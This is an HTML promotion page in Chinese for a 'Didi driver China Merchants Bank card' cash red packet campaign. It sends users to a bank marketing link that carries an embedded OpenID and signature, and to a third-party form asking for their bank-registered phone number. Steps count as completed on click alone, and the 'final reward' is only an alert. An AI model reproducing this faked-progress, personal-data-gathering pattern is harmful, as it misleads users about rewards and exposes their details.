  <!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>滴滴司机招行提现卡活动</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #333;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(to right, #ff7e5f, #feb47b);
            color: white;
            padding: 25px 20px;
            text-align: center;
            position: relative;
        }
        
        .header h1 {
            font-size: 1.8rem;
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .header p {
            font-size: 1rem;
            opacity: 0.9;
        }
        
        .content {
            padding: 30px;
        }
        
        .instructions {
            background: #f8f9fa;
            border-left: 4px solid #4e89ff;
            padding: 15px;
            border-radius: 0 8px 8px 0;
            margin-bottom: 25px;
            font-size: 0.95rem;
        }
        
        .instructions ul {
            padding-left: 20px;
            margin-top: 10px;
        }
        
        .instructions li {
            margin-bottom: 8px;
            line-height: 1.5;
        }
        
        .activity-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .activity-card {
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .activity-card.active {
            border-color: #4e89ff;
            background: #f0f7ff;
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(78, 137, 255, 0.2);
        }
        
        .activity-card.completed {
            border-color: #4caf50;
            background: #f0fff4;
        }
        
        .activity-card.completed::after {
            content: '\f058';
            font-family: 'Font Awesome 6 Free';
            font-weight: 900;
            position: absolute;
            top: 10px;
            right: 10px;
            color: #4caf50;
            font-size: 24px;
        }
        
        .activity-card h3 {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 1.3rem;
        }
        
        .activity-card h3 i {
            background: #4e89ff;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        
        .activity-card.completed h3 i {
            background: #4caf50;
        }
        
        .activity-card p {
            color: #555;
            margin-bottom: 15px;
            line-height: 1.6;
        }
        
        .btn {
            display: inline-block;
            padding: 12px 25px;
            background: #4e89ff;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            text-decoration: none;
            box-shadow: 0 4px 10px rgba(78, 137, 255, 0.3);
        }
        
        .btn:hover {
            background: #3a75f5;
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(78, 137, 255, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn.completed {
            background: #4caf50;
            box-shadow: 0 4px 10px rgba(76, 175, 80, 0.3);
        }
        
        .btn.completed:hover {
            background: #43a047;
        }
        
        .btn.disabled {
            background: #bdbdbd;
            cursor: not-allowed;
            box-shadow: none;
        }
        
        .btn.disabled:hover {
            transform: none;
        }
        
        .progress-container {
            margin-top: 30px;
            text-align: center;
        }
        
        .progress-bar {
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            margin: 15px 0;
            overflow: hidden;
            position: relative;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(to right, #ff7e5f, #feb47b);
            width: 0%;
            border-radius: 4px;
            transition: width 0.5s ease;
        }
        
        .progress-text {
            font-weight: 600;
            color: #ff7e5f;
            margin-bottom: 20px;
        }
        
        .final-action {
            margin-top: 25px;
            padding-top: 25px;
            border-top: 1px dashed #ddd;
            text-align: center;
        }
        
        .final-action .btn {
            background: linear-gradient(to right, #ff7e5f, #feb47b);
            padding: 15px 40px;
            font-size: 1.1rem;
            box-shadow: 0 5px 15px rgba(255, 126, 95, 0.3);
        }
        
        .final-action .btn:hover {
            background: linear-gradient(to right, #f76c4a, #fda768);
            box-shadow: 0 7px 18px rgba(255, 126, 95, 0.4);
        }
        
        .final-action .btn.disabled {
            background: #bdbdbd;
            box-shadow: none;
        }
        
        .status-badge {
            position: absolute;
            top: 0;
            right: 0;
            background: #ff9800;
            color: white;
            padding: 5px 10px;
            font-size: 0.8rem;
            border-radius: 0 0 0 12px;
            font-weight: bold;
        }
        
        .completed .status-badge {
            background: #4caf50;
        }
        
        @media (max-width: 480px) {
            .content {
                padding: 20px 15px;
            }
            
            .header h1 {
                font-size: 1.5rem;
            }
            
            .activity-card {
                padding: 15px;
            }
            
            .activity-card h3 {
                font-size: 1.1rem;
            }
            
            .btn {
                padding: 10px 20px;
                font-size: 0.9rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-qrcode"></i> 滴滴司机招行提现卡活动</h1>
            <p>请完成以下两个活动领取招行提现卡现金红包</p>
        </div>
        
        <div class="content">
            <div class="instructions">
                <strong>参与说明：</strong>
                <ul>
                    <li>您需要依次填写以下两个界面的信息</li>
                    <li>只有填写完第一个活动后，才能填写第二个活动</li>
                    <li>填写完两个活动后才能获得参加提现领现金红包活动</li>
                    <li>请按顺序填写，不要跳过任何信息</li>
                </ul>
            </div>
            
            <div class="activity-container">
                <div class="activity-card active" id="activity1">
                    <span class="status-badge">当前活动</span>
                    <h3><i class="fas fa-gift"></i> 活动一：红包资格登记</h3>
                    <p>请填写您的招行预留手机号</p>
                    <a href="#" class="btn" id="btn-activity1">参与活动一</a>
                </div>
                
                <div class="activity-card" id="activity2">
                    <span class="status-badge">尚未解锁</span>
                    <h3><i class="fas fa-trophy"></i> 活动二：招行提现卡预约</h3>
                    <p>完成活动一后即可点击活动二~</p>
                    <a href="#" class="btn disabled" id="btn-activity2">请先完成活动一</a>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-text">完成进度: <span id="progress-text">0%</span></div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progress-fill"></div>
                </div>
                <div>完成两个活动即可解锁“滴滴平台提现招行领现金红包”！</div>
            </div>
            
            <div class="final-action">
                <a href="#" class="btn disabled" id="btn-final">领取最终奖励</a>
                <p style="margin-top: 15px; font-size: 0.9rem; color: #777;">完成两个活动后此按钮将激活</p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const activity1 = document.getElementById('activity1');
            const activity2 = document.getElementById('activity2');
            const btnActivity1 = document.getElementById('btn-activity1');
            const btnActivity2 = document.getElementById('btn-activity2');
            const btnFinal = document.getElementById('btn-final');
            const progressFill = document.getElementById('progress-fill');
            const progressText = document.getElementById('progress-text');
            
            // 模拟活动URL（实际使用时替换为真实URL）
            const activity1Url = "https://market.cmbchina.com/MPage/online/240918181125685/byov.html?RcmID=040443&MID=corp8&AuthType=snsapi_base&OpenID=oDXZ9jqtxfFrZ45WJMbwnuE26sLw&unionid=&is_snapshotuser=&TimeStamp=1755573905&Nonce=3585&Signature=IuY9dFEQek8m6Yvm5N8DY77K65GTLgwWko%2fFC2ktSeM%3d";
            const activity2Url = "http://jxtsn0e0onh9bdjd.mikecrm.com/vxyILAe";
            
            // 活动完成状态
            let activity1Completed = false;
            let activity2Completed = false;
            
            // 更新进度条
            function updateProgress() {
                let progress = 0;
                if (activity1Completed) progress += 50;
                if (activity2Completed) progress += 50;
                
                progressFill.style.width = progress + '%';
                progressText.textContent = progress + '%';
                
                if (progress === 100) {
                    btnFinal.classList.remove('disabled');
                    btnFinal.textContent = "领取最终奖励";
                }
            }
            
            // 活动一按钮点击事件
            btnActivity1.addEventListener('click', function(e) {
                e.preventDefault();
                
                // 在实际应用中，这里应该打开活动一的真实URL
                window.open(activity1Url, '_blank');
                
                // 模拟活动完成
                simulateActivityCompletion(1);
            });
            
            // 活动二按钮点击事件
            btnActivity2.addEventListener('click', function(e) {
                e.preventDefault();
                
                // 在实际应用中，这里应该打开活动二的真实URL
                window.open(activity2Url, '_blank');
                
                // 模拟活动完成
                simulateActivityCompletion(2);
            });
            
            // 最终奖励按钮点击事件
            btnFinal.addEventListener('click', function(e) {
                if (this.classList.contains('disabled')) {
                    e.preventDefault();
                    return;
                }
                
                alert('🎉 恭喜您已完成全部活动！解锁领取招行提现卡现金红包吧~');
            });
            
            // 模拟活动完成（实际应用中不需要此函数）
            function simulateActivityCompletion(activityNum) {
                if (activityNum === 1 && !activity1Completed) {
                    // 标记活动一完成
                    activity1Completed = true;
                    activity1.classList.remove('active');
                    activity1.classList.add('completed');
                    activity1.querySelector('.status-badge').textContent = "已完成";
                    activity1.querySelector('.status-badge').style.background = "#4caf50";
                    
                    // 更新活动一按钮
                    btnActivity1.classList.add('completed');
                    btnActivity1.innerHTML = '<i class="fas fa-check"></i> 已完成';
                    
                    // 解锁活动二
                    activity2.classList.add('active');
                    activity2.querySelector('.status-badge').textContent = "可参与";
                    activity2.querySelector('.status-badge').style.background = "#4e89ff";
                    btnActivity2.classList.remove('disabled');
                    btnActivity2.textContent = "参与活动二";
                    
                    updateProgress();
                    
                    // 显示提示信息
                    setTimeout(() => {
                        alert('活动一已完成！现在可以参与活动二了。');
                    }, 500);
                    
                } else if (activityNum === 2 && activity1Completed && !activity2Completed) {
                    // 标记活动二完成
                    activity2Completed = true;
                    activity2.classList.remove('active');
                    activity2.classList.add('completed');
                    activity2.querySelector('.status-badge').textContent = "已完成";
                    activity2.querySelector('.status-badge').style.background = "#4caf50";
                    
                    // 更新活动二按钮
                    btnActivity2.classList.add('completed');
                    btnActivity2.innerHTML = '<i class="fas fa-check"></i> 已完成';
                    
                    updateProgress();
                    
                    // 显示提示信息
                    setTimeout(() => {
                        alert('活动二已完成！现在可以领取最终奖励了。');
                    }, 500);
                }
            }
            
            // 初始化进度
            updateProgress();
        });
    </script>
</body>
</html>
